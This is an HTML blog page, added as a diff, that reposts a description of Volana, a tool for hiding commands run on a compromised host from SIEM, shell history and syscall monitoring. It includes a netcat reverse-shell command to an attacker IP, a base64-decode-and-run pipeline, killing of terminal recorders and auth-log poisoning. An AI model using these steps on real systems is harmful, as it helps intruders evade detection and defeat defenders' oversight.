@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>Volana - Shell Command Obfuscation To Avoid Detection Systems</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>Volana - Shell Command Obfuscation To Avoid Detection Systems</h1>
+			<b><time>19.06.2024 08:30</time></b>
+		       
+
+			<div>
+				<h1 id="volana---shell-command-obfuscation-to-avoid-detection-systems">Volana - Shell Command Obfuscation To Avoid Detection Systems</h1>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h4 id="shell-command-obfuscation-to-avoid-siemdetection-system">Shell command obfuscation to avoid SIEM/detection system</h4>
+<p>During pentest, an important aspect is to <strong>be <a href="https://www.kitploit.com/search/label/Stealth" title="stealth">stealth</a></strong>. For this reason you should <strong>clear your tracks after your passage</strong>. Nevertheless, many infrastructures log command and send them to a <a href="https://www.kitploit.com/search/label/Siem" title="SIEM">SIEM</a> in a real time making the afterwards cleaning part alone useless.</p>
+<p><code>volana</code> provide a simple way to hide commands executed on compromised machine by providing it self shell runtime (enter your command, volana executes for you). Like this you <strong>clear your tracks DURING your passage</strong></p>
+<h2 id="usage">Usage</h2>
+<p>You need to get an interactive shell. (Find a way to spawn it, you are a hacker, it&rsquo;s your job ! <a href="https://github.com/ariary/volana#from-non-interactive-shell" title="otherwise">otherwise</a>). Then download it on target machine and launch it. that&rsquo;s it, now you can type the command you want to be stealthy executed</p>
+<pre tabindex="0"><code>## Download it from github release## If you do not have internet access from compromised machine, find another waycurl -lO -L https://github.com/ariary/volana/releases/latest/download/volana## Execute it./volana## You are now under the radarvolana » echo &#34;Hi SIEM team! Do you find me?&#34; &gt; /dev/null 2&gt;&amp;1  #you are allowed to be a bit cockyvolana » [command]
+</code></pre><p>Keyword for volana console: * <code>ring</code>: enable ring mode ie each command is launched with plenty others to cover tracks (from solution that monitor system call) * <code>exit</code>: exit volana console</p>
+<h3 id="from-non-interactive-shell">from non interactive shell</h3>
+<p>Imagine you have a non interactive shell (webshell or blind rce), you could use <code>[encrypt](https://www.kitploit.com/search/label/Encrypt &quot;encrypt&quot;)</code> and <code>decrypt</code> subcommand. Previously, you need to build <code>volana</code> with embedded <a href="https://www.kitploit.com/search/label/Encryption" title="🌒 Shell command obfuscation to avoid detection systems (5)"></a><a href="https://www.kitploit.com/search/label/Encrypt" title="encrypt">encrypt</a>ion key.</p>
+<p><strong>On attacker machine</strong></p>
+<pre tabindex="0"><code>## Build volana with encryption keymake build.volana-with-encryption## Transfer it on TARGET (the unique detectable command)## [...]## Encrypt the command you want to stealthy execute## (Here a nc bindshell to obtain a interactive shell)volana encr &#34;nc [attacker_ip] [attacker_port] -e /bin/bash&#34;&gt;&gt;&gt; ENCRYPTED COMMAND
+</code></pre><p>Copy encrypted command and executed it with your rce <strong>on target machine</strong></p>
+<pre tabindex="0"><code>./volana decr [encrypted_command]## Now you have a bindshell, spawn it to make it interactive and use volana usually to be stealth (./volana). + Don&#39;t forget to remove volana binary before leaving (cause decryption key can easily be retrieved from it)
+</code></pre><p><strong><em>Why not just hide command with <code>echo [command] | base64</code> ?</em></strong> And <a href="https://www.kitploit.com/search/label/Decode" title="decode">decode</a> on target with <code>echo [encoded_command] | base64 -d | bash</code></p>
+<p>Because we want to be protected against systems that trigger alert for <code>base64</code> use or that seek base64 text in command. Also we want to make investigation difficult and base64 isn&rsquo;t a real brake.</p>
+<h2 id="detection">Detection</h2>
+<p>Keep in mind that <code>volana</code> is not a miracle that will make you totally invisible. Its aim is to make intrusion detection and investigation harder.</p>
+<p>By detected we mean if we are able to trigger an alert if a certain command has been executed.</p>
+<h3 id="hide-from">Hide from</h3>
+<p>Only the <code>volana</code> launching command line will be catched. 🧠 <strong>However, by adding a space</strong> before executing it, the default bash behavior is to not save it</p>
+<ul>
+<li>Detection systems that are based on history command output</li>
+<li>Detection systems that are based on history files</li>
+<li><code>.bash_history</code>, &ldquo;.zsh_history&rdquo; etc ..</li>
+<li>Detection systems that are based on bash debug traps</li>
+<li>Detection systems that are based on sudo built-in logging system</li>
+<li>Detection systems tracing all processes syscall system-wide (eg <code>opensnoop</code>)</li>
+<li>Terminal (tty) recorder (<code>script</code>, <code>screen -L</code>, <a href="https://github.com/ariary/sexonthebash" title="🌒 Shell command obfuscation to avoid detection systems (8)"><code>sexonthebash</code></a>, <code>ovh-ttyrec</code>, etc..)</li>
+<li>Easy to detect &amp; avoid: <code>pkill -9 script</code></li>
+<li>Not a common case</li>
+<li><code>screen</code> is a bit more difficult to avoid, however it does not register input (secret input: <code>stty -echo</code> =&gt; avoid)</li>
+<li>Command detection Could be avoid with <code>volana</code> with encryption</li>
+</ul>
+<h3 id="visible-for">Visible for</h3>
+<ul>
+<li>Detection systems that have alert for unknown command (volana one)</li>
+<li>Detection systems that are based on keylogger</li>
+<li>Easy to avoid: copy/past commands</li>
+<li>Not a common case</li>
+<li>Detection systems that are based on syslog files (e.g. <code>/var/log/auth.log</code>)</li>
+<li>Only for <code>sudo</code> or <code>su</code> commands</li>
+<li>syslog file could be modified and thus be poisoned as you wish (e.g for <em>/var/log/auth.log</em>:<code>logger -p auth.info &quot;No hacker is poisoning your syslog solution, don't worry&quot;</code>)</li>
+<li>Detection systems that are based on syscall (eg auditd,LKML/eBPF)</li>
+<li>Difficult to analyze, could be make unreadable by making several diversion syscalls</li>
+<li>Custom <code>LD_PRELOAD</code> injection to make log</li>
+<li>Not a common case at all</li>
+</ul>
+<h2 id="bug-bounty">Bug bounty</h2>
+<p>Sorry for the clickbait title, but no money will be provided for contibutors. 🐛</p>
+<p>Let me know if you have found: * a way to detect <code>volana</code> * a way to spy console that don&rsquo;t detect <code>volana</code> commands * a way to avoid a detection system</p>
+<p><a href="https://github.com/ariary/volana/issues/new/choose" title="Report here">Report here</a></p>
+<h2 id="credit">Credit</h2>
+<ul>
+<li><a href="https://github.com/annmuor/zn2021_8ways" title="8 ways to spy on console">8 ways to spy on console</a></li>
+<li><a href="https://github.com/mufeedvh/moonwalk" title="moonwalk">moonwalk</a>: similar tool that clear tracks AFTER passage</li>
+</ul>
+<p><strong><a href="https://github.com/ariary/volana" title="Download Volana">Download Volana</a></strong></p>
+<h2><a href="http://www.kitploit.com/2024/06/volana-shell-command-obfuscation-to.html">Source</a>
+<!-- raw HTML omitted --></h2>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-20-srsly-risky-biz-chinas-mss-gets-persona/">Srsly Risky Biz Chinas MSS gets personal</a></li>
+				
+				<li><a href="/posts/2025-03-19-risky-bulletin-google-buys-wiz-for-32-b/">Risky Bulletin Google buys Wiz for 32 billion</a></li>
+				
+				<li><a href="/posts/apple-inc-sent-you-a-payment-request-payoneer-invoices-other-microsoft-enabled-scams/">“Apple Inc sent you a payment request” Payoneer invoices; other Microsoft-enabled scams</a></li>
+				
+				<li><a href="/posts/glasses-that-transcribe-text-to-audio/">“Glasses” That Transcribe Text To Audio</a></li>
+				
+				<li><a href="/posts/5-best-linux-centos-replacement-options-alternatives/">&lt;div&gt;5 Best Linux CentOS Replacement Options &amp; Alternatives&lt;/div&gt;</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
